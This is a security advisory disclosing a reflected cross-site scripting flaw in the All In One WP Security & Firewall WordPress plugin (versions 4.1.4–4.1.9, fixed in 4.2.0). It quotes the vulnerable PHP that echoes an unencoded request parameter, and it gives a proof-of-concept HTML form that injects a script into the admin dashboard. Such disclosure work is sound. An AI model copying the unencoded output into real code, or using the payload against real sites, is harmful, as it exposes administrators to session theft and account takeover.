------------------------------------------------------------------------
Cross-Site Scripting in All In One WP Security & Firewall WordPress
Plugin
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Scripting vulnerability was found in the All In One WP
Security & Firewall Plugin. This issue allows an attacker to perform a
wide variety of actions, such as stealing Administrators' session
tokens, or performing arbitrary actions on their behalf. In order to
exploit this issue, the attacker has to lure/force a logged on WordPress
Administrator into opening a malicious website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160731-0003

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
These issues were successfully tested on the All In One WP Security &
Firewall WordPress Plugin version 4.1.4 - 4.1.9.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue has been addressed in All In One WP Security & Firewall
version 4.2.0.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
https://sumofpwn.nl/advisory/2016/cross_site_scripting_in_all_in_one_wp_security___firewall_wordpress_plugin.html

This issue exists in the file admin/wp-security-dashboard-menu.php and is caused due to the lack of output encoding on the tab request parameter.

<div class="inside">
   <?php
   //Fetch, prepare, sort, and filter our data...
   $locked_ip_list->prepare_items();
   //echo "put table of locked entries here";
   ?>
   <form id="tables-filter" method="get"
      onSubmit="return confirm('Are you sure you want to perform this bulk operation on the selected entries?');">
      <!-- For plugins, we also need to ensure that the form posts back to our current page -->
      <input type="hidden" name="page" value="<?php echo esc_attr($_REQUEST['page']); ?>"/>
      <?php
      if (isset($_REQUEST["tab"])) {
         echo '<input type="hidden" name="tab" value="' . $_REQUEST["tab"] . '" />';
      }
      ?>
      <!-- Now we can render the completed list table -->
      <?php $locked_ip_list->display(); ?>
   </form>
</div>

In order to exploit this issue, the attacker has to lure/force a logged on WordPress Administrator into opening a malicious website.


Proof of concept

<html>
   <body>
      <form action="http://<target>/wp-admin/admin.php?page=aiowpsec&tab=tab3" method="POST">
         <input type="hidden" name="tab" value="&quot;&gt;&lt;script&gt;alert&#40;1&#41;&lt;&#47;script&gt;" />
         <input type="submit" value="Submit request" />
      </form>
   </body>
</html>


------------------------------------------------------------------------
Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
goal is to contribute to the security of popular, widely used OSS
projects in a fun and educational way.

